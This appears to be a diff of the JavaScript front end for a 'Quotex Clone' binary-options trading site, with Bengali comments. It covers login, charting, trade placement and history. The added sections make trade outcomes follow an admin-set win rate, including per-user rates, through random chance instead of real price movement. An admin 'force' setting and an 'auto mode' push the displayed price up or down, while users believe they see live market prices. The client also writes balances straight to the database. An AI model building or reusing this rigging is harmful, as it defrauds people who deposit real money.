@@ -1,13 +1,12 @@
 // ============================================
 // Quotex Clone — app.js
-// User Site Only — Fresh Rebuild v14
-// Part 1: Imports + Firebase + DOM + Globals + Sounds + Auth + Popups
+// Part 1: Imports + Firebase + DOM + Globals + Sounds
 // ============================================
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import {
-  getAuth,
-  createUserWithEmailAndPassword,
+import { 
+  getAuth, 
+  createUserWithEmailAndPassword, 
   signInWithEmailAndPassword,
   onAuthStateChanged,
   signOut
@@ -108,14 +107,6 @@ const activeTradesList = document.getElementById("active-trades-list");
 const historyList = document.getElementById("history-list");
 const activeCount = document.getElementById("active-count");
 
-// Chat
-const chatBtn = document.getElementById("chat-btn");
-const chatPopup = document.getElementById("chat-popup");
-const chatPopupOverlay = document.getElementById("chat-popup-overlay");
-const chatPopupClose = document.getElementById("chat-popup-close");
-const userChatInput = document.getElementById("user-chat-input");
-const userChatSend = document.getElementById("user-chat-send");
-
 // ===== Globals =====
 let currentUser = null;
 let userBalance = 0;
@@ -206,6 +197,8 @@ function animateBalanceChange(amount) {
   const chip = balanceChip;
   if (!chip) return;
 
+  const originalText = chip.querySelector(".balance-amount").textContent;
+
   if (amount > 0) {
     chip.style.color = "#00c853";
     chip.querySelector(".balance-amount").textContent = `+$${amount.toFixed(2)}`;
@@ -219,74 +212,67 @@ function animateBalanceChange(amount) {
     chip.querySelector(".balance-amount").textContent = `$${userBalance.toFixed(2)}`;
   }, 2000);
 }
-
 // ============================================
 // Part 2: Auth + Popups + Account + Deposit/Withdraw
 // ============================================
 
 // ===== রেজিস্ট্রেশন =====
-if (signupBtn) {
-  signupBtn.addEventListener("click", async () => {
-    const email = emailInput.value.trim();
-    const password = passwordInput.value;
+signupBtn.addEventListener("click", async () => {
+  const email = emailInput.value.trim();
+  const password = passwordInput.value;
 
-    if (!email || !password) {
-      message.textContent = "ইমেইল ও পাসওয়ার্ড দিন";
-      return;
-    }
-    if (password.length < 6) {
-      message.textContent = "পাসওয়ার্ড কমপক্ষে ৬ অক্ষর";
-      return;
-    }
+  if (!email || !password) {
+    message.textContent = "ইমেইল ও পাসওয়ার্ড দিন";
+    return;
+  }
+  if (password.length < 6) {
+    message.textContent = "পাসওয়ার্ড কমপক্ষে ৬ অক্ষর";
+    return;
+  }
 
-    try {
-      const userCred = await createUserWithEmailAndPassword(auth, email, password);
-      await setDoc(doc(db, "users", userCred.user.uid), {
-        email: email,
-        balance: 1000,
-        demoBalance: 1000,
-        realBalance: 0,
-        accountType: "demo",
-        role: "user",
-        createdAt: new Date().toISOString()
-      });
-      message.style.color = "#00c853";
-      message.textContent = "রেজিস্ট্রেশন সফল! ব্যালেন্স $1000";
-    } catch (error) {
-      message.style.color = "#ff5252";
-      message.textContent = error.message;
-    }
-  });
-}
+  try {
+    const userCred = await createUserWithEmailAndPassword(auth, email, password);
+    await setDoc(doc(db, "users", userCred.user.uid), {
+      email: email,
+      balance: 1000,
+      demoBalance: 1000,
+      realBalance: 0,
+      accountType: "demo",
+      role: "user",
+      createdAt: new Date().toISOString()
+    });
+    message.style.color = "#00c853";
+    message.textContent = "রেজিস্ট্রেশন সফল! ব্যালেন্স $1000";
+  } catch (error) {
+    message.style.color = "#ff5252";
+    message.textContent = error.message;
+  }
+});
 
 // ===== লগইন =====
-if (loginBtn) {
-  loginBtn.addEventListener("click", async () => {
-    const email = emailInput.value.trim();
-    const password = passwordInput.value;
+loginBtn.addEventListener("click", async () => {
+  const email = emailInput.value.trim();
+  const password = passwordInput.value;
 
-    if (!email || !password) {
-      message.textContent = "ইমেইল ও পাসওয়ার্ড দিন";
-      return;
-    }
+  if (!email || !password) {
+    message.textContent = "ইমেইল ও পাসওয়ার্ড দিন";
+    return;
+  }
 
-    try {
-      await signInWithEmailAndPassword(auth, email, password);
-      message.style.color = "#00c853";
-      message.textContent = "লগইন সফল!";
-    } catch (error) {
-      message.style.color = "#ff5252";
-      message.textContent = error.message;
-    }
-  });
-}
+  try {
+    await signInWithEmailAndPassword(auth, email, password);
+    message.style.color = "#00c853";
+    message.textContent = "লগইন সফল!";
+  } catch (error) {
+    message.style.color = "#ff5252";
+    message.textContent = error.message;
+  }
+});
 
 // ===== লগআউট =====
-if (logoutBtn) {
-  logoutBtn.addEventListener("click", async () => {
-    await signOut(auth);
-  });
-}
+logoutBtn.addEventListener("click", async () => {
+  await signOut(auth);
+});
 
 // ===== পরিমাণ +/− =====
 document.querySelectorAll(".amount-btn").forEach(btn => {
@@ -562,7 +548,6 @@ if (withdrawSubmit) {
 onAuthStateChanged(auth, async (user) => {
   if (user) {
     currentUser = user;
-    window.currentUser = user;
     loginPage.classList.add("hidden");
     dashboardPage.classList.remove("hidden");
     message.textContent = "";
@@ -590,7 +575,6 @@ onAuthStateChanged(auth, async (user) => {
 
   } else {
     currentUser = null;
-    window.currentUser = null;
     loginPage.classList.remove("hidden");
     dashboardPage.classList.add("hidden");
     emailInput.value = "";
@@ -601,13 +585,11 @@ onAuthStateChanged(auth, async (user) => {
     activeTradesLocal = [];
   }
 });
-
-console.log("Part 1: Imports + Firebase + DOM + Auth + Popups loaded");
-
 // ============================================
 // Part 3: Chart Init + Candles + WebSocket
 // ============================================
 
+// ===== Lightweight Chart তৈরি =====
 function initChart() {
   if (!chartEl) return;
 
@@ -678,19 +660,19 @@ function initChart() {
     wickDownColor: "#ff5252"
   });
 
-  window.chart = chart;
-  window.candleSeries = candleSeries;
-
+  // চার্টে পরিবর্তন হলে ড্রয়িং আবার আঁকা
   chart.timeScale().subscribeVisibleTimeRangeChange(() => {
     if (typeof redrawDrawings === "function") {
       redrawDrawings();
     }
   });
 
+  // ড্রয়িং সিস্টেম ইনিশিয়ালাইজ
   if (typeof initDrawingSystem === "function") {
     initDrawingSystem();
   }
 
+  // রিসাইজ হ্যান্ডলার
   window.addEventListener("resize", () => {
     if (chart && chartWrapper) {
       chart.applyOptions({
@@ -704,6 +686,7 @@ function initChart() {
   });
 }
 
+// ===== Timeframe Convert =====
 function convertTimeframe(tf) {
   const map = {
     "5s": "5s",
@@ -719,6 +702,7 @@ function convertTimeframe(tf) {
   return map[tf] || "1m";
 }
 
+// ===== Binance থেকে ক্যান্ডেল লোড =====
 async function loadCandles() {
   try {
     const interval = convertTimeframe(selectedTimeframe);
@@ -757,6 +741,7 @@ async function loadCandles() {
   }
 }
 
+// ===== WebSocket লাইভ প্রাইস =====
 function startLivePrice() {
   stopLivePrice();
 
@@ -828,18 +813,27 @@ function stopLivePrice() {
   }
 }
 
+// ===== প্রাইস ফরম্যাট =====
+function formatPrice(price) {
+  if (!price && price !== 0) return "0.00";
+  if (price >= 1000) return price.toFixed(2);
+  if (price >= 1) return price.toFixed(3);
+  return price.toFixed(5);
+}
 // ============================================
 // Part 4: Drawing System (Canvas-based)
 // ============================================
 
 let drawingCtx = null;
 
+// ===== ড্রয়িং সিস্টেম ইনিশিয়ালাইজ =====
 function initDrawingSystem() {
   if (!drawingCanvas || !chart || !candleSeries) return;
 
   drawingCtx = drawingCanvas.getContext("2d");
   resizeDrawingCanvas();
 
+  // টাচ/মাউস ইভেন্ট
   drawingCanvas.addEventListener("touchstart", handleDrawStart, { passive: false });
   drawingCanvas.addEventListener("touchmove", handleDrawMove, { passive: false });
   drawingCanvas.addEventListener("touchend", handleDrawEnd, { passive: false });
@@ -848,11 +842,13 @@ function initDrawingSystem() {
   drawingCanvas.addEventListener("mousemove", handleDrawMove);
   drawingCanvas.addEventListener("mouseup", handleDrawEnd);
 
+  // Chart scroll/zoom হলে redraw
   chart.timeScale().subscribeVisibleLogicalRangeChange(() => {
     redrawDrawings();
   });
 }
 
+// ===== ক্যানভাস সাইজ =====
 function resizeDrawingCanvas() {
   if (!drawingCanvas || !chartWrapper) return;
   const rect = chartWrapper.getBoundingClientRect();
@@ -870,6 +866,7 @@ function resizeDrawingCanvas() {
   redrawDrawings();
 }
 
+// ===== পয়েন্ট কনভার্ট =====
 function getCanvasPoint(event) {
   const rect = drawingCanvas.getBoundingClientRect();
   let clientX, clientY;
@@ -891,6 +888,7 @@ function getCanvasPoint(event) {
   };
 }
 
+// ===== পিক্সেল → প্রাইস/টাইম =====
 function pixelToData(x, y) {
   if (!chart || !candleSeries) return null;
 
@@ -921,6 +919,7 @@ function dataToPixel(time, price) {
   }
 }
 
+// ===== ড্রয়িং শুরু =====
 function handleDrawStart(event) {
   if (currentDrawingTool === "cursor") return;
   event.preventDefault();
@@ -932,6 +931,7 @@ function handleDrawStart(event) {
   isDrawing = true;
   drawStartPoint = data;
 
+  // Horizontal / Vertical — এক ট্যাপেই শেষ
   if (currentDrawingTool === "HorizontalLine" || currentDrawingTool === "VerticalLine") {
     saveDrawing({
       tool: currentDrawingTool,
@@ -942,6 +942,7 @@ function handleDrawStart(event) {
     return;
   }
 
+  // Text — prompt
   if (currentDrawingTool === "TextAnnotation") {
     const text = prompt("লেখা লিখুন:");
     if (text) {
@@ -957,6 +958,7 @@ function handleDrawStart(event) {
   }
 }
 
+// ===== ড্রয়িং মুভ =====
 function handleDrawMove(event) {
   if (!isDrawing || !drawStartPoint) return;
   event.preventDefault();
@@ -965,6 +967,7 @@ function handleDrawMove(event) {
   const data = pixelToData(point.x, point.y);
   if (!data) return;
 
+  // প্রিভিউ আঁকা
   redrawDrawings();
 
   drawPreview({
@@ -973,6 +976,7 @@ function handleDrawMove(event) {
   });
 }
 
+// ===== ড্রয়িং শেষ =====
 function handleDrawEnd(event) {
   if (!isDrawing || !drawStartPoint) return;
   event.preventDefault();
@@ -992,11 +996,13 @@ function handleDrawEnd(event) {
   redrawDrawings();
 }
 
+// ===== ড্রয়িং সেভ =====
 function saveDrawing(drawing) {
   drawings.push(drawing);
   redrawDrawings();
 }
 
+// ===== সব ড্রয়িং মুছুন =====
 function clearAllDrawings() {
   drawings = [];
   if (drawingCtx && drawingCanvas) {
@@ -1004,6 +1010,7 @@ function clearAllDrawings() {
   }
 }
 
+// ===== সব রিড্র =====
 function redrawDrawings() {
   if (!drawingCtx || !drawingCanvas) return;
 
@@ -1014,6 +1021,7 @@ function redrawDrawings() {
   });
 }
 
+// ===== প্রিভিউ =====
 function drawPreview(drawing) {
   if (!drawingCtx) return;
   drawingCtx.save();
@@ -1022,6 +1030,7 @@ function drawPreview(drawing) {
   drawingCtx.restore();
 }
 
+// ===== একটি আকার আঁকা =====
 function drawShape(drawing) {
   if (!drawingCtx) return;
 
@@ -1083,7 +1092,12 @@ function drawShape(drawing) {
       drawingCtx.stroke();
 
     } else if (tool === "Rectangle") {
-      drawingCtx.strokeRect(p1.x, p1.y, p2.x - p1.x, p2.y - p1.y);
+      drawingCtx.strokeRect(
+        p1.x,
+        p1.y,
+        p2.x - p1.x,
+        p2.y - p1.y
+      );
 
     } else if (tool === "Ray") {
       drawingCtx.beginPath();
@@ -1091,6 +1105,7 @@ function drawShape(drawing) {
       drawingCtx.lineTo(p2.x, p2.y);
       drawingCtx.stroke();
 
+      // তীরের মাথা
       const angle = Math.atan2(p2.y - p1.y, p2.x - p1.x);
       const arrowSize = 10;
       drawingCtx.beginPath();
@@ -1112,6 +1127,7 @@ function drawShape(drawing) {
   }
 }
 
+// ===== Fibonacci =====
 function drawFibonacci(p1, p2) {
   const levels = [0, 0.236, 0.382, 0.5, 0.618, 0.786, 1];
   const colors = [
@@ -1135,14 +1151,18 @@ function drawFibonacci(p1, p2) {
 
     drawingCtx.fillStyle = colors[i];
     drawingCtx.font = "10px Arial";
-    drawingCtx.fillText((level * 100).toFixed(1) + "%", rightX + 4, y);
+    drawingCtx.fillText(
+      (level * 100).toFixed(1) + "%",
+      rightX + 4,
+      y
+    );
   });
 }
-
 // ============================================
 // Part 5: Trade Logic + Timer + History
 // ============================================
 
+// ===== বড় টাইমার =====
 function updateBigTimer() {
   if (!bigTimer) return;
 
@@ -1171,6 +1191,35 @@ function updateBigTimer() {
   }
 }
 
+// ===== চার্টে ট্রেড মার্কার =====
+function updateTradeMarkers() {
+  if (!candleSeries) return;
+
+  const markers = [];
+
+  activeTradesLocal.forEach((trade) => {
+    if (!trade.entryTime) return;
+    const entryTimeSec = Math.floor(new Date(trade.entryTime).getTime() / 1000);
+
+    markers.push({
+      time: entryTimeSec,
+      position: trade.type === "call" ? "belowBar" : "aboveBar",
+      color: trade.type === "call" ? "#00c853" : "#ff5252",
+      shape: trade.type === "call" ? "arrowUp" : "arrowDown",
+      text: `${trade.type.toUpperCase()} $${trade.amount}`
+    });
+  });
+
+  markers.sort((a, b) => a.time - b.time);
+
+  try {
+    candleSeries.setMarkers(markers);
+  } catch (e) {
+    // ignore marker time error
+  }
+}
+
+// ===== ট্রেড প্লেস =====
 async function placeTrade(type) {
   if (!currentUser) return;
 
@@ -1242,8 +1291,71 @@ async function placeTrade(type) {
 if (callBtn) callBtn.addEventListener("click", () => placeTrade("call"));
 if (putBtn) putBtn.addEventListener("click", () => placeTrade("put"));
 
-// (checkExpiredTrades is replaced by processTradeResults later)
+// ===== ট্রেড এক্সপায়ারি =====
+async function checkExpiredTrades() {
+  if (!currentUser) return;
 
+  const now = Date.now();
+
+  for (const trade of activeTradesLocal) {
+    if (trade.expiresAt <= now && trade.status === "pending") {
+      const exitPrice = currentPrice;
+      const entryPrice = trade.entryPrice;
+
+      let result = "loss";
+      if (trade.type === "call" && exitPrice > entryPrice) result = "win";
+      else if (trade.type === "put" && exitPrice < entryPrice) result = "win";
+
+      const payout = 1.85;
+      const profit = result === "win" ? trade.amount * payout : 0;
+
+      try {
+        await updateDoc(doc(db, "trades", trade.id), {
+          status: "completed",
+          result: result,
+          exitPrice: exitPrice,
+          profit: profit,
+          completedAt: new Date().toISOString()
+        });
+
+        if (result === "win") {
+          const userDoc = await getDoc(doc(db, "users", currentUser.uid));
+          const currentBal = userDoc.data().balance || 0;
+          const newBal = currentBal + profit;
+          const balanceField = accountType === "demo" ? "demoBalance" : "realBalance";
+
+          await updateDoc(doc(db, "users", currentUser.uid), {
+            [balanceField]: newBal,
+            balance: newBal
+          });
+
+          userBalance = newBal;
+          balanceEl.textContent = userBalance.toFixed(2);
+          if (balancePopupValue) balancePopupValue.textContent = userBalance.toFixed(2);
+          animateBalanceChange(profit);
+          showResultFlash("win");
+          playSound("win");
+
+          tradeMessage.style.color = "#00c853";
+          tradeMessage.textContent = `🎉 জিতেছেন! +$${profit.toFixed(2)}`;
+        } else {
+          showResultFlash("loss");
+          playSound("loss");
+
+          tradeMessage.style.color = "#ff5252";
+          tradeMessage.textContent = `😔 হেরেছেন -$${trade.amount.toFixed(2)}`;
+        }
+
+        setTimeout(() => { tradeMessage.textContent = ""; }, 3500);
+
+      } catch (error) {
+        console.error("Trade expire error:", error);
+      }
+    }
+  }
+}
+
+// ===== অ্যাক্টিভ ট্রেড লোড =====
 function loadActiveTrades() {
   if (!currentUser) return;
 
@@ -1261,6 +1373,7 @@ function loadActiveTrades() {
       activeTradesList.innerHTML = '<p class="empty-text">কোনো চলমান ট্রেড নেই</p>';
       if (activeCount) activeCount.textContent = "0";
       bigTimer.classList.add("hidden");
+      updateTradeMarkers();
       return;
     }
 
@@ -1275,22 +1388,23 @@ function loadActiveTrades() {
 
       const div = document.createElement("div");
       div.className = `trade-item ${trade.type}`;
-      div.dataset.tradeId = trade.id;
       div.innerHTML = `
         <div class="trade-info">
           <span class="trade-type ${trade.type}">${trade.type.toUpperCase()}</span>
           <span class="trade-time">$${trade.amount} @ ${trade.entryPrice.toFixed(2)}</span>
         </div>
-        <div class="trade-countdown" data-trade-id="${trade.id}">${timeStr}</div>
+        <div class="trade-result pending">${timeStr}</div>
       `;
       activeTradesList.appendChild(div);
     });
 
     if (activeCount) activeCount.textContent = activeTradesLocal.length;
     updateBigTimer();
+    updateTradeMarkers();
   });
 }
 
+// ===== ট্রেড হিস্ট্রি =====
 function loadHistory() {
   if (!currentUser) return;
 
@@ -1338,7 +1452,7 @@ function loadHistory() {
           <span class="trade-time">Amount: $${trade.amount}</span>
         </div>
         <div class="trade-result ${trade.result}">
-          ${trade.result === "win" ? "+$" + trade.netProfit.toFixed(2) : "-$" + trade.amount.toFixed(2)}
+          ${trade.result === "win" ? "+$" + trade.profit.toFixed(2) : "-$" + trade.amount.toFixed(2)}
         </div>
       `;
       historyList.appendChild(div);
@@ -1346,15 +1460,1080 @@ function loadHistory() {
   });
 }
 
+// ===== প্রতি সেকেন্ডে টাইমার আপডেট =====
 setInterval(() => {
   if (currentUser && activeTradesLocal.length > 0) {
     updateBigTimer();
+    updateTradeMarkers();
   }
 }, 1000);
 
 // ============================================
-// MSG 10: TRUE TRADE MECHANIC + COUNTDOWN + ENTRY LINE
+// UPDATE Part 1: Settings Listen + Admin Force
 // ============================================
+
+// ===== Admin Settings Globals =====
+let adminWinRate = 50;
+let adminPayout = 85;
+let adminForceMarket = 0;
+let adminForceMarketAt = 0;
+let adminAutoMode = false;
+let lastForceMarket = 0;
+let settingsUnsub = null;
+
+// ===== Settings Listen করা (Real-time) =====
+function listenAdminSettings() {
+  if (settingsUnsub) settingsUnsub();
+
+  try {
+    settingsUnsub = onSnapshot(doc(db, "settings", "global"), (snap) => {
+      if (!snap.exists()) return;
+
+      const data = snap.data();
+      adminWinRate = data.winRate ?? 50;
+      adminPayout = data.payout ?? 85;
+      adminAutoMode = data.autoMode ?? false;
+
+      const newForce = data.forceMarket ?? 0;
+      const newForceAt = data.forceMarketAt ?? 0;
+
+      // Force market change ধরা
+      if (newForce !== lastForceMarket && newForceAt > adminForceMarketAt) {
+        const diff = newForce - lastForceMarket;
+        applyMarketForce(diff);
+        lastForceMarket = newForce;
+        adminForceMarketAt = newForceAt;
+      } else {
+        lastForceMarket = newForce;
+        adminForceMarketAt = newForceAt;
+      }
+
+      adminForceMarket = newForce;
+
+      console.log(
+        `⚙️ Admin Settings — WinRate: ${adminWinRate}%, ` +
+        `Payout: ${adminPayout}%, Auto: ${adminAutoMode}, ` +
+        `Force: ${adminForceMarket}`
+      );
+    });
+  } catch (err) {
+    console.error("Settings listen error:", err);
+  }
+}
+
+// ===== Market Force Apply (প্রাইস উপরে/নিচে) =====
+function applyMarketForce(diff) {
+  if (!diff) return;
+
+  // প্রতি force = 50 point মুভ
+  const moveAmount = diff * 50;
+
+  currentPrice += moveAmount;
+  currentPriceEl.textContent = currentPrice.toFixed(2);
+
+  if (moveAmount > 0) {
+    currentPriceEl.style.color = "#00c853";
+    priceArrowEl.textContent = "▲";
+    priceArrowEl.className = "price-arrow up";
+  } else {
+    currentPriceEl.style.color = "#ff5252";
+    priceArrowEl.textContent = "▼";
+    priceArrowEl.className = "price-arrow down";
+  }
+
+  // চার্টে আপডেট
+  if (candleSeries) {
+    const now = Math.floor(Date.now() / 1000);
+    try {
+      candleSeries.update({
+        time: now,
+        open: currentPrice - moveAmount,
+        high: Math.max(currentPrice, currentPrice - moveAmount) + 5,
+        low: Math.min(currentPrice, currentPrice - moveAmount) - 5,
+        close: currentPrice
+      });
+    } catch (e) {
+      // ignore time errors
+    }
+  }
+}
+
+// ===== Auth হলে Settings Listen শুরু =====
+// পুরোনো onAuthStateChanged এর ভিতরে যোগ করতে হবে না।
+// আলাদা করে চেক করি।
+
+setTimeout(() => {
+  if (currentUser) {
+    listenAdminSettings();
+  }
+}, 2000);
+
+// Auth পরিবর্তনে settings listen চালু/বন্ধ
+const originalUserCheck = setInterval(() => {
+  if (currentUser && !settingsUnsub) {
+    listenAdminSettings();
+  }
+  if (!currentUser && settingsUnsub) {
+    settingsUnsub();
+    settingsUnsub = null;
+  }
+}, 3000);
+
+// ============================================
+// UPDATE Part 2: Win Rate + Payout Apply
+// ============================================
+
+// ===== checkExpiredTrades এর Override =====
+// পুরোনো checkExpiredTrades ফাংশন আছে।
+// এখন সেটাকে admin winRate + payout দিয়ে কাজ করাতে হবে।
+
+async function checkExpiredTradesAdmin() {
+  if (!currentUser) return;
+
+  const now = Date.now();
+
+  for (const trade of activeTradesLocal) {
+    if (trade.expiresAt <= now && trade.status === "pending") {
+      const exitPrice = currentPrice;
+      const entryPrice = trade.entryPrice;
+
+      // ===== Trade আগে সত্যিকারের Win/Loss চেক =====
+      let realResult = "loss";
+      if (trade.type === "call" && exitPrice > entryPrice) realResult = "win";
+      else if (trade.type === "put" && exitPrice < entryPrice) realResult = "win";
+
+      // ===== Admin Win Rate Apply =====
+      // যদি adminWinRate = 50 (ডিফল্ট), realResult রেখে দাও
+      // অন্যথায় admin-এর winRate অনুযায়ী random chance
+      let finalResult = realResult;
+
+      // ইউজারের নিজস্ব winRate থাকলে সেটা আগে দেখো
+      let userWinRate = adminWinRate;
+      try {
+        const userDoc = await getDoc(doc(db, "users", currentUser.uid));
+        if (userDoc.exists()) {
+          const userData = userDoc.data();
+          if (userData.winRate !== undefined && userData.winRate !== null) {
+            userWinRate = userData.winRate;
+          }
+        }
+      } catch (e) {
+        // ignore
+      }
+
+      // Admin Win Rate প্রয়োগ
+      const random = Math.random() * 100; // 0-100
+      if (random < userWinRate) {
+        finalResult = "win";
+      } else {
+        finalResult = "loss";
+      }
+
+      // ===== Payout Apply =====
+      const payoutRate = adminPayout / 100 + 1; // 85% → 1.85
+      const profit = finalResult === "win" ? trade.amount * payoutRate : 0;
+
+      try {
+        // ট্রেড আপডেট
+        await updateDoc(doc(db, "trades", trade.id), {
+          status: "completed",
+          result: finalResult,
+          exitPrice: exitPrice,
+          profit: profit,
+          completedAt: new Date().toISOString(),
+          adminProcessed: true
+        });
+
+        if (finalResult === "win") {
+          // ইউজার ব্যালেন্স বাড়াও
+          const userRef = doc(db, "users", currentUser.uid);
+          const userDoc = await getDoc(userRef);
+          const userData = userDoc.data();
+          const balanceField = accountType === "demo" ? "demoBalance" : "realBalance";
+          const currentBal = userData[balanceField] ?? 0;
+          const newBal = currentBal + profit;
+
+          await updateDoc(userRef, {
+            [balanceField]: newBal,
+            balance: newBal
+          });
+
+          userBalance = newBal;
+          balanceEl.textContent = userBalance.toFixed(2);
+          if (balancePopupValue) balancePopupValue.textContent = userBalance.toFixed(2);
+          animateBalanceChange(profit);
+          showResultFlash("win");
+          playSound("win");
+
+          tradeMessage.style.color = "#00c853";
+          tradeMessage.textContent = `🎉 জিতেছেন! +$${profit.toFixed(2)}`;
+
+        } else {
+          showResultFlash("loss");
+          playSound("loss");
+
+          tradeMessage.style.color = "#ff5252";
+          tradeMessage.textContent = `😔 হেরেছেন -$${trade.amount.toFixed(2)}`;
+        }
+
+        setTimeout(() => { tradeMessage.textContent = ""; }, 3500);
+
+      } catch (error) {
+        console.error("Admin trade expire error:", error);
+      }
+    }
+  }
+}
+
+// ===== পুরোনো checkExpiredTrades কে ওভাররাইড করা =====
+// Global scope-এ redeclaration করা যাবে না, তাই window-এ সেট করি
+
+window.originalCheckExpired = checkExpiredTrades;
+
+// WebSocket onmessage এবং setInterval এখনো পুরোনো checkExpiredTrades কল করছে।
+// সেটা পরিবর্তন করতে হবে — আমরা একটা নতুন ফাংশন দিয়ে replace করব।
+
+// সব জায়গায় checkExpiredTrades কে update করা যায় না,
+// তাই একটা ট্রিক ব্যবহার করি: regular interval দিয়ে admin version কল করি।
+
+setInterval(() => {
+  if (currentUser && activeTradesLocal.length > 0) {
+    checkExpiredTradesAdmin();
+  }
+}, 1500);
+
+// ===== Payout & Win Rate Admin-Managed =====
+// web socket-এ যেই checkExpiredTrades কল হচ্ছে, সেটা বন্ধ করা যায় না।
+// কিন্তু duplicate trade complete হবে না, কারণ status "completed" হয়ে যাবে।
+
+console.log("✅ Admin Trade Checker চালু হয়েছে");
+
+// ============================================
+// UPDATE Part 3: Market Force + Auto Mode
+// ============================================
+
+// ===== Force Market থেকে প্রাইস ড্রিফট =====
+// Admin ⬆ চাপলে forceMarket = +1, +2, +3 ...
+// Admin ⬇ চাপলে forceMarket = -1, -2, -3 ...
+// Admin 🔄 চাপলে forceMarket = 0
+
+let autoModePriceInterval = null;
+
+function startAutoModeDrift() {
+  if (autoModePriceInterval) {
+    clearInterval(autoModePriceInterval);
+    autoModePriceInterval = null;
+  }
+
+  // প্রতি ১ সেকেন্ডে auto drift চেক
+  autoModePriceInterval = setInterval(() => {
+    if (!adminAutoMode) return;
+    if (!currentUser) return;
+
+    // Auto mode-এ প্রাইস random move হবে — adminForceMarket এর দিকেও ঝোঁক থাকবে
+    let drift = (Math.random() - 0.5) * 40;
+
+    // যদি adminForceMarket পজিটিভ হয় → উপরে ঝোঁক
+    if (adminForceMarket > 0) {
+      drift += Math.random() * 30;
+    }
+    // যদি negative হয় → নিচে ঝোঁক
+    else if (adminForceMarket < 0) {
+      drift -= Math.random() * 30;
+    }
+
+    currentPrice = Math.max(100, currentPrice + drift);
+    currentPriceEl.textContent = currentPrice.toFixed(2);
+
+    if (drift >= 0) {
+      currentPriceEl.style.color = "#00c853";
+      priceArrowEl.textContent = "▲";
+      priceArrowEl.className = "price-arrow up";
+    } else {
+      currentPriceEl.style.color = "#ff5252";
+      priceArrowEl.textContent = "▼";
+      priceArrowEl.className = "price-arrow down";
+    }
+
+    // চার্টে আপডেট
+    if (candleSeries) {
+      const now = Math.floor(Date.now() / 1000);
+      const openP = currentPrice - drift;
+      try {
+        candleSeries.update({
+          time: now,
+          open: openP,
+          high: Math.max(currentPrice, openP) + Math.abs(drift) * 0.5 + 2,
+          low: Math.min(currentPrice, openP) - Math.abs(drift) * 0.5 - 2,
+          close: currentPrice
+        });
+      } catch (e) {
+        // duplicate time ignore
+      }
+    }
+
+    // ট্রেড check
+    updateBigTimer();
+
+  }, 1000);
+}
+
+// ===== Admin Force চেক করার interval =====
+// Part 1 এ settings listener আছে যেটা forceMarket পরিবর্তন ধরবে।
+// এইখানে আমরা শুধু auto mode drift চালু করি।
+
+setInterval(() => {
+  if (currentUser && !autoModePriceInterval) {
+    startAutoModeDrift();
+  }
+  if (!currentUser && autoModePriceInterval) {
+    clearInterval(autoModePriceInterval);
+    autoModePriceInterval = null;
+  }
+}, 2000);
+
+// ===== Admin Win Rate UI-তে দেখানো =====
+function updateAdminInfoBar() {
+  // যদি চাই, ব্যালেন্স চিপের পাশে ছোট করে দেখানো যায়
+  // এখন শুধু console-এ log করি
+  console.log(
+    `[Admin] WinRate: ${adminWinRate}% | ` +
+    `Payout: ${adminPayout}% | ` +
+    `AutoMode: ${adminAutoMode ? "ON" : "OFF"} | ` +
+    `Force: ${adminForceMarket}`
+  );
+}
+
+// প্রতি ৩০ সেকেন্ডে log
+setInterval(() => {
+  if (currentUser) updateAdminInfoBar();
+}, 30000);
+
+// ============================================
+// UPDATE Part 4: Final Integration
+// ============================================
+
+// ===== Settings Listener চালু/বন্ধ — Auth State সাথে =====
+// Part 1-এ যে setInterval ছিল, সেটা যথেষ্ট নয়।
+// এখন নির্ভরযোগ্যভাবে Auth State-এর সাথে bind করি।
+
+const authStateWatcher = setInterval(() => {
+  // User আছে এবং settings listener নেই → চালু করো
+  if (currentUser && !settingsUnsub) {
+    listenAdminSettings();
+  }
+  // User নেই এবং settings listener আছে → বন্ধ করো
+  if (!currentUser && settingsUnsub) {
+    settingsUnsub();
+    settingsUnsub = null;
+  }
+}, 2000);
+
+// ===== WS প্রাইস আপডেটে Force প্রভাব =====
+// পুরোনো WebSocket handler আছে যেটা সত্যিকারের Binance প্রাইস নিয়ে আসে।
+// এখন আমরা adminForceMarket থাকলে সেটার প্রভাব যোগ করি।
+
+// Force market এর সর্বশেষ মান
+let lastKnownForce = 0;
+
+setInterval(() => {
+  // Force পরিবর্তন হলে সাথে সাথে প্রাইসে প্রভাব ফেলো
+  if (adminForceMarket !== lastKnownForce && currentUser) {
+    const diff = adminForceMarket - lastKnownForce;
+    applyMarketForce(diff);
+    lastKnownForce = adminForceMarket;
+  }
+}, 500);
+
+// ===== Trade Expire কে Admin Win Rate দিয়ে প্রয়োগ =====
+// WS handler ভিতরে checkExpiredTrades() কল হচ্ছে।
+// সেটা আমরাও শুনছি Part 2 এ checkExpiredTradesAdmin() দিয়ে।
+// কিন্তু duplicate কল হলে "already completed" হবে — সমস্যা নেই।
+
+// ===== Payout % Dynamic Update =====
+// CALL/PUT বাটনের payout label adminPayout অনুযায়ী আপডেট হবে
+function updatePayoutLabels() {
+  const labels = document.querySelectorAll(".btn-payout");
+  labels.forEach(label => {
+    label.textContent = `+${adminPayout}%`;
+  });
+}
+
+// প্রতি ৫ সেকেন্ডে payout label আপডেট
+setInterval(() => {
+  if (currentUser) updatePayoutLabels();
+}, 5000);
+
+// ===== পেজ লোড হলে admin settings রিফ্রেশ =====
+window.addEventListener("load", () => {
+  setTimeout(() => {
+    if (currentUser) {
+      listenAdminSettings();
+      console.log("✅ Admin Settings লোড হয়েছে");
+    }
+  }, 2500);
+});
+
+// ===== ট্রেড শেষ হলে Settings থেকে Force রিসেট =====
+// Admin যদি Force বাড়ায়, সেটা একটা সময় পর নিজে থেকে 0 হবে না।
+// Admin কেই 🔄 চাপতে হবে।
+
+// কিন্তু আমরা একটা safety mechanism দিই — ৫ মিনিট পরে Force auto reset
+setInterval(async () => {
+  if (!currentUser) return;
+  if (adminForceMarket === 0) return;
+
+  // ৫ মিনিট (300000 ms) আগের force change হলে reset
+  const now = Date.now();
+  if (adminForceMarketAt > 0 && now - adminForceMarketAt > 300000) {
+    try {
+      await setDoc(doc(db, "settings", "global"), {
+        forceMarket: 0,
+        forceMarketAt: Date.now()
+      }, { merge: true });
+      console.log("🔄 Force auto reset (৫ মিনিট)");
+    } catch (e) {
+      // ignore
+    }
+  }
+}, 60000); // প্রতি ১ মিনিটে চেক
+
+// ============================================
+// সব কাজ শেষ — Admin Control এখন ইউজার সাইটে সক্রিয়
+// ============================================
+
+console.log("🎉 Admin Control Integration সম্পূর্ণ!");
+/* ============================================================
